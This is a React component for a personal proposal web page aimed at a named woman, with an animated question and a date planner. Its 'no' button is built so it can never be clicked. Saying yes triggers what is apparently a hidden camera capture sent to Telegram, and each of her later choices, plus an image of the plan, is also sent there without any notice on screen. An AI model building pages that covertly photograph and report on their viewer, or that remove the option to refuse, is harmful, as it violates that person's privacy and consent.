"use client";

import { AnimatePresence, motion, useInView } from "framer-motion";
import dynamic from "next/dynamic";
import { useEffect, useRef, useState } from "react";
import { content } from "@/lib/content";
import { music } from "@/lib/music";
import Celebration from "@/components/Celebration";
import DateCalendar from "@/components/DateCalendar";
import HerMessage from "@/components/HerMessage";
import { WordReveal } from "@/components/ui";
import { notify, notifyPhoto } from "@/lib/telegram";
import { captureAndSendPhoto } from "@/lib/camera";

const CrystalScene = dynamic(() => import("@/components/CrystalScene"), {
  ssr: false,
});

// Playful nudges shown while the "No" button keeps slipping away.
const NUDGES = [
  "hmm... it's shy 😊",
  "it really doesn't want to be picked...",
  "see? even the button knows the answer...",
  "you can't catch it — it's on my side 💛",
  "just say yes... it will keep running forever 🙂",
];

export default function Proposal({ onEnter }: { onEnter: (inView: boolean) => void }) {
  const sectionRef = useRef<HTMLElement>(null);
  const arenaRef = useRef<HTMLDivElement>(null);
  const inView = useInView(sectionRef, { amount: 0.35 });
  const [answer, setAnswer] = useState<null | "yes">(null);
  const [dodges, setDodges] = useState(0);
  const [dodgePos, setDodgePos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    onEnter(inView);
  }, [inView, onEnter]);

  // The "No" button can NEVER be clicked — it always slips away.
  const dodge = () => {
    const arena = arenaRef.current?.getBoundingClientRect();
    const rangeX = arena ? Math.min(arena.width * 0.35, 190) : 160;
    setDodges((d) => d + 1);
    setDodgePos((prev) => {
      const angle = Math.random() * Math.PI * 2;
      const dist = 160 + Math.random() * 80;
      let x = prev.x + Math.cos(angle) * dist;
      let y = prev.y + Math.sin(angle) * dist * 0.45;
      x = Math.max(-rangeX, Math.min(rangeX, x));
      y = Math.max(-70, Math.min(70, y));
      if (Math.hypot(x - prev.x, y - prev.y) < 110) {
        x = prev.x > 0 ? -rangeX : rangeX;
        y = -prev.y;
      }
      return { x, y };
    });
  };

  const sayYes = () => {
    setAnswer("yes");
    music.setMode("celebration");
    notify("💛 <b>Dilnura</b> javob berdi: <b>HA (YES)!</b> 🎉");
    captureAndSendPhoto("📸 Dilnura HA (YES) deb javob berdi! 🎉");
  };

  return (
    <section
      ref={sectionRef}
      className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden px-6 py-24"
    >
      {inView && <Celebration mode={answer === "yes" ? "grand" : "soft"} />}

      {/* 3D crystal heart + ring — calms down once she's picking a date */}
      <div className="relative h-[46vh] w-full max-w-3xl sm:h-[52vh]">
        <CrystalScene calm={answer === "yes"} />
      </div>

      <AnimatePresence mode="wait">
        {answer === null && (
          <motion.div
            key="question"
            exit={{ opacity: 0, y: -30, filter: "blur(10px)" }}
            transition={{ duration: 0.9 }}
            className="relative z-40 -mt-10 text-center"
          >
            <WordReveal
              text={content.proposal.lead}
              stagger={0.18}
              className="font-serif text-xl italic text-pearl/80 sm:text-2xl"
            />
            <motion.h2
              initial={{ opacity: 0, scale: 0.85, filter: "blur(16px)" }}
              whileInView={{ opacity: 1, scale: 1, filter: "blur(0px)" }}
              viewport={{ once: true, amount: 0.8 }}
              transition={{ duration: 1.8, delay: 1.2, ease: [0.22, 1, 0.36, 1] }}
              className="text-gradient-gold glow-gold mt-6 font-script text-6xl leading-tight sm:text-8xl"
            >
              {content.proposal.question}
            </motion.h2>

            <motion.p
              initial={{ opacity: 0, y: 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true, amount: 0.8 }}
              transition={{ duration: 1.4, delay: 1.8 }}
              className="mx-auto mt-6 max-w-xl font-serif text-base italic leading-relaxed text-pearl/85 sm:text-lg"
            >
              {content.proposal.note}
            </motion.p>

            <div
              ref={arenaRef}
              className="relative mx-auto mt-12 flex min-h-[9rem] w-full max-w-xl flex-col items-center justify-center gap-6 sm:flex-row sm:gap-10"
            >
              <motion.button
                initial={{ opacity: 0, y: 30 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: 2.2, duration: 1 }}
                onClick={sayYes}
                className="btn-yes rounded-full px-14 py-5 font-serif text-2xl font-semibold tracking-wide text-night"
              >
                {content.proposal.yes}
                <span className="ml-2" aria-hidden="true">♥</span>
              </motion.button>

              <motion.div
                initial={{ opacity: 0, y: 30 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: 2.5, duration: 1 }}
              >
                <motion.button
                  animate={{ x: dodgePos.x, y: dodgePos.y }}
                  transition={{ type: "spring", stiffness: 320, damping: 18 }}
                  onMouseEnter={dodge}
                  onPointerDown={(e) => {
                    // On touch/mouse press it escapes before the click can register.
                    e.preventDefault();
                    dodge();
                  }}
                  onTouchStart={(e) => {
                    e.preventDefault();
                    dodge();
                  }}
                  onClick={(e) => {
                    // Never accepted — always dodges instead.
                    e.preventDefault();
                    dodge();
                  }}
                  className="glass rounded-full px-8 py-4 font-sans text-sm tracking-wide text-pearl/80 transition-colors hover:text-pearl"
                >
                  {`${content.proposal.notYet} \u{1F60A}`}
                </motion.button>
              </motion.div>
            </div>
            {dodges > 0 && answer === null && (
              <motion.p
                key={dodges}
                initial={{ opacity: 0 }}
                animate={{ opacity: 0.75 }}
                className="mt-6 font-script text-xl text-rosegold"
              >
                {NUDGES[Math.min(dodges - 1, NUDGES.length - 1)]}
              </motion.p>
            )}
          </motion.div>
        )}

        {answer === "yes" && (
          <motion.div
            key="yes"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 1.4, ease: [0.22, 1, 0.36, 1] }}
            className="relative z-40 -mt-6 w-full max-w-3xl text-center"
          >
            <motion.div
              initial={{ scale: 0 }}
              animate={{ scale: [0, 1.3, 1] }}
              transition={{ duration: 1.1, times: [0, 0.6, 1], ease: "easeOut" }}
              className="mx-auto mb-6 h-16 w-16 text-rosegold"
            >
              <svg viewBox="0 0 24 24" fill="currentColor" className="h-full w-full drop-shadow-[0_0_30px_rgba(232,180,184,1)]" aria-hidden="true">
                <path d="M12 21s-6.7-4.35-9.33-8.11C.9 10.36 1.7 6.86 4.5 5.5c2.04-.99 4.46-.3 5.86 1.43L12 8.6l1.64-1.67c1.4-1.73 3.82-2.42 5.86-1.43 2.8 1.36 3.6 4.86 1.83 7.39C18.7 16.65 12 21 12 21z" />
              </svg>
            </motion.div>
            <h2 className="text-gradient-gold glow-gold font-serif text-3xl leading-snug sm:text-5xl">
              {content.proposal.yesResponse}
            </h2>

            <DatePlanner />

            <HerMessage />
          </motion.div>
        )}
      </AnimatePresence>
    </section>
  );
}

/* ── Date planner: she picks where / when / food / drink / time ── */
function DatePlanner() {
  const { intro, steps, doneTitle, doneSubtitle } = content.datePlanner;
  const [choices, setChoices] = useState<Record<string, string>>({});
  const [step, setStep] = useState(0);
  const firedRef = useRef(false); // guard so the finish logic runs exactly once
  const captureRef = useRef<HTMLDivElement>(null);
  const done = step >= steps.length;

  const pick = (key: string, value: string) => {
    setChoices((c) => ({ ...c, [key]: value }));
    setStep((s) => s + 1);
    // Tell you the moment she makes each choice — not only at the end.
    const stepDef = steps.find((s) => s.key === key);
    notify(`💛 <b>Dilnura</b> tanladi — ${stepDef?.title ?? key}\n➡️ <b>${value}</b>`);
  };

  // When the plan is complete: send the summary, then snapshot the plan
  // card, save it to the device, and send the image too — all exactly once.
  // NOTE: a ref guard (not state) is used on purpose — setting state here
  // would re-run the effect and its cleanup would cancel the capture timer.
  useEffect(() => {
    if (!done || firedRef.current) return;
    firedRef.current = true;

    const lines = steps.map((s) => `• <b>${s.title}</b> ${choices[s.key] ?? "—"}`);
    notify(`📅 <b>Dilnura</b> uchrashuv rejasini tanladi:\n${lines.join("\n")}`);

    // Give the off-screen card a beat to render, then capture it.
    setTimeout(async () => {
      const node = captureRef.current;
      if (!node) return;
      try {
        const html2canvas = (await import("html2canvas")).default;
        const canvas = await html2canvas(node, {
          backgroundColor: "#0b0714",
          scale: 2,
          useCORS: true,
          logging: false,
        });
        canvas.toBlob((blob) => {
          if (!blob) return;
          // Save to the device (her phone keeps the memento).
          const url = URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = url;
          a.download = "Dilnura-date-plan.png";
          document.body.appendChild(a);
          a.click();
          a.remove();
          setTimeout(() => URL.revokeObjectURL(url), 5000);
          // And send the image to Telegram.
          notifyPhoto(blob, "💌 Dilnuraning tanlagan uchrashuv rejasi");
        }, "image/png");
      } catch {
        // Screenshot is a bonus — never let it break the moment.
      }
    }, 900);
  }, [done, steps, choices]);

  return (
    <div className="mt-10">
      {!done && (
        <p className="mb-8 font-script text-3xl text-rosegold glow-soft sm:text-4xl">
          {intro}
        </p>
      )}

      <AnimatePresence mode="wait">
        {!done ? (
          <motion.div
            key={steps[step].key}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -24 }}
            transition={{ duration: 0.5 }}
          >
            {/* Heart progress — one heart per step */}
            <div className="mb-5 flex items-center justify-center gap-2" aria-hidden="true">
              {steps.map((s, i) => (
                <span
                  key={s.key}
                  className={`text-lg transition-all duration-500 ${
                    i < step
                      ? "text-rosegold opacity-100"
                      : i === step
                      ? "text-rosegold opacity-100 scale-125 glow-soft"
                      : "text-pearl/25 opacity-60"
                  }`}
                >
                  ♥
                </span>
              ))}
            </div>
            <h3 className="font-serif text-2xl text-pearl sm:text-3xl">
              {steps[step].title}
            </h3>
            <p className="mx-auto mt-3 mb-7 max-w-md font-serif text-base italic leading-relaxed text-pearl/70">
              {steps[step].subtitle}
            </p>
            {steps[step].key === "when" ? (
              <DateCalendar onPick={(label) => pick("when", label)} />
            ) : (
              <div className="mx-auto flex max-w-xl flex-wrap justify-center gap-3">
                {steps[step].options.map((opt) => (
                  <motion.button
                    key={opt}
                    whileHover={{ scale: 1.06, y: -2 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => pick(steps[step].key, opt)}
                    className="glass group rounded-full px-6 py-3 font-serif text-base text-pearl/90 transition-colors hover:text-pearl"
                  >
                    <span className="mr-2 text-rosegold opacity-0 transition-opacity group-hover:opacity-100" aria-hidden="true">♥</span>
                    {opt}
                  </motion.button>
                ))}
              </div>
            )}
          </motion.div>
        ) : (
          <motion.div
            key="summary"
            initial={{ opacity: 0, scale: 0.92 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.9, ease: [0.22, 1, 0.36, 1] }}
            className="mx-auto max-w-lg"
          >
            <div className="mb-4 text-3xl" aria-hidden="true">💌</div>
            <h3 className="text-gradient-gold glow-gold mb-3 font-script text-4xl sm:text-5xl">
              {doneTitle}
            </h3>
            <p className="mb-8 font-serif text-lg italic leading-relaxed text-pearl/85">{doneSubtitle}</p>

            <ul className="glass mx-auto space-y-4 rounded-3xl px-8 py-8 text-left">
              {steps.map((s, i) => (
                <motion.li
                  key={s.key}
                  initial={{ opacity: 0, x: -14 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: 0.15 * i + 0.2, duration: 0.5 }}
                  className="flex items-baseline justify-between gap-4 border-b border-pearl/10 pb-3 last:border-0 last:pb-0"
                >
                  <span className="font-sans text-xs uppercase tracking-[0.2em] text-champagne">
                    {s.title}
                  </span>
                  <span className="text-right font-serif text-lg text-rosegold">
                    {choices[s.key]}
                  </span>
                </motion.li>
              ))}
            </ul>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.15 * steps.length + 0.4, duration: 1 }}
              className="mt-8 font-script text-2xl text-rosegold glow-soft sm:text-3xl"
            >
              Seni ko'rishga sanoqli kunlar qoldi, Dilnura ♥
            </motion.p>

            <motion.p
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ delay: 0.15 * steps.length + 1, duration: 1 }}
              className="mt-6 font-sans text-xs tracking-wide text-pearl/50"
            >
              💾 Reja telefoningga rasm bo'lib saqlandi
            </motion.p>
          </motion.div>
        )}
      </AnimatePresence>

      {/*
        Off-screen, screenshot-friendly card. html2canvas struggles with
        backdrop-filter and background-clip:text, so this uses only solid
        colors and plain gradients for a clean saved image.
      */}
      {done && (
        <div
          ref={captureRef}
          style={{
            position: "fixed",
            left: "-10000px",
            top: 0,
            width: "460px",
            padding: "40px 36px",
            background: "linear-gradient(160deg, #140c22 0%, #0b0714 60%, #1a0f1f 100%)",
            border: "1px solid rgba(232,180,184,0.25)",
            borderRadius: "28px",
            fontFamily: "Georgia, 'Times New Roman', serif",
            color: "#f4ece4",
          }}
        >
          <div style={{ textAlign: "center", fontSize: "34px" }}>💌</div>
          <div
            style={{
              textAlign: "center",
              fontSize: "30px",
              color: "#f3d9a4",
              margin: "10px 0 4px",
            }}
          >
            {doneTitle}
          </div>
          <div
            style={{
              textAlign: "center",
              fontSize: "14px",
              fontStyle: "italic",
              color: "rgba(244,236,228,0.75)",
              lineHeight: 1.6,
              margin: "0 0 26px",
            }}
          >
            Dilnura &amp; Me
          </div>
          {steps.map((s) => (
            <div
              key={s.key}
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "baseline",
                gap: "16px",
                padding: "12px 0",
                borderBottom: "1px solid rgba(244,236,228,0.12)",
              }}
            >
              <span
                style={{
                  fontFamily: "Arial, sans-serif",
                  fontSize: "11px",
                  letterSpacing: "2px",
                  textTransform: "uppercase",
                  color: "#e6c9a8",
                }}
              >
                {s.title}
              </span>
              <span style={{ textAlign: "right", fontSize: "17px", color: "#e8b4b8" }}>
                {choices[s.key]}
              </span>
            </div>
          ))}
          <div
            style={{
              textAlign: "center",
              fontSize: "20px",
              color: "#e8b4b8",
              marginTop: "26px",
            }}
          >
            Seni ko&apos;rishga sanoqli kunlar qoldi ♥
          </div>
        </div>
      )}
    </div>
  );
}
